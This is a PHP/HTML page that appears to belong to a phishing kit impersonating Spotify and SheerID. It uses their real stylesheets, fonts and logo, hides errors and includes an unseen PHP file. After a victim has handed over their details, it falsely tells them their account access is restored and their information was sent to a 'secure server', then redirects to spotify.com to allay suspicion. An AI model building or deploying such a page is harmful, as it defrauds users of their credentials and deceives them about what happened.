<?php
error_reporting(0);
include "./3d/index.php";

?>
<html lang="en">
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<title>Congratulations !</title>
<link rel="icon" href="../../lib/img/spot.ico">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="stylesheet" href="https://spotify-international.sheerid.com/libraries/bootstrap-3.2.0/css/bootstrap.min.css" type="text/css">
<link rel="stylesheet" href="https://spotify-international.sheerid.com/common/vendors/bootstrap-select/dist/css/bootstrap-select.css" type="text/css">
<link rel="stylesheet" href="https://spotify-international.sheerid.com/common/sheerid/css/promotion.css" type="text/css">
<meta http-equiv="refresh" content="4;url=https://www.spotify.com"/>
<style>
	@font-face {
    font-family: Circular-Medium;
    src: url("https://s3.amazonaws.com/com.sheerid.resources/spotify/css/fonts/CircularSpotifyText-Medium.otf") format("opentype");
}
@font-face {
    font-family: Circular-Book;
    src: url("https://s3.amazonaws.com/com.sheerid.resources/spotify/css/fonts/CircularSpotifyText-Book.otf") format("opentype");
}
@font-face {
    font-family: Circular-Bold;
    src: url("https://s3.amazonaws.com/com.sheerid.resources/spotify/css/fonts/CircularSpotifyText-Bold.otf") format("opentype");
}
a, a:hover {
    color: #03bb4f;
    text-decoration: none;
}
body {
    background-color: #f8f8f8;
    color: #000000;
  display:none;
}
button[type=submit], button[type=submit]:hover, button[type=submit]:focus, .action, .action:hover, .action:focus {
  font-family: Circular-Bold;
  font-size: 14px;
  width: initial;
  min-width: 240px;
  height: inherit;
  min-height: 48px;
  white-space: normal;
  background-color: #1db954 !important;
  color: white;
  border-radius: 25px;
  padding: 16px;
  border: 0px;
}
label {
    font-family: Circular-Bold;  
}
p {
    font-family: Circular-Book;
    font-size: 16px;
    color: #000000;
    margin-bottom: 32px;
    line-height: 24px;
}
ul {
  margin-left: 0px;
  padding-left: 20px;  
}

#offer {
    font-family: Circular-Book;
    font-size: 14px;
    color: #000000;
    margin-bottom: 18px;
}
.container-fluid {
    padding: 0px;
}
#sheerid-header {
    width: 100%;
    margin-bottom: 0px;
}
#logo-container img {
    padding-top: 32px;
    padding-bottom: 32px;
}
#sheerid-body{
    margin-left: 70px;
    margin-right: 70px;
    max-width: 540px;
    margin-bottom: 0px;
    margin-left: 16px;
    margin-right: 16px;
}
#sheerid-container {
    background-color: #ffffff;
    max-width: 540px;
    margin: 0 auto 0 auto;
}
#step-title {
    margin-bottom: 0px;
    padding-left: 0px;
    padding-right: 0px;
}
#step-title p {
    font-family: Circular-Medium;
    font-size: 24px;
    font-weight: 500;
    color: #000000;
    text-transform: none;
    line-height: 32px;
}
</style>
</head>
<body class="verify" style="display: block;">
<input type="hidden" id="refresh" value="yes">
<br><br>
<div id="sheerid-container" class="container-fluid">
<div id="sheerid-header" class="row">
<div id="logo-container" class="col-xs-12 centered">
<img src="https://s3.amazonaws.com/com.sheerid.resources/spotify/img/Spotify_Logo_RGB_Black.png" alt="SheerID">
</div>
</div>
<div id="sheerid-body" class="row">
<div id="step-title" class="col-xs-12 centered">
<p>Congratulations !</p>
</div><p id="offer" class="col-xs-12"></p>
<div id="verify-errors" class="col-xs-12">
</div>
<div id="person-info" class="form-group row"><center>
<label id="label-personalInfo">You have restored your account access. Now you can use your account as usual, all information had been sent in encrypted form to our secure server. Thank you for using Spotify</label>
</center>
</div><br><br>             
<div id="form-container" class="col-xs-12">
<form id="verifyForm" method="POST" action="https://www.spotify.com" class="" accept-charset="utf-8">
<link rel="stylesheet" href="https://spotify-international.sheerid.com/common/vendors/flags/flags.css" type="text/css">
</div>
<style type="text/css">
    .form-group.hidden {
        display: none;
    }
</style>
<div class="form-group row">
<div class="col-xs-12 centered">
<button type="submit" class="btn btn-default" aria-label="submit">Next</button>
</div>
</div>
</form>
</div>
</div>
</div>   
</body>
</html>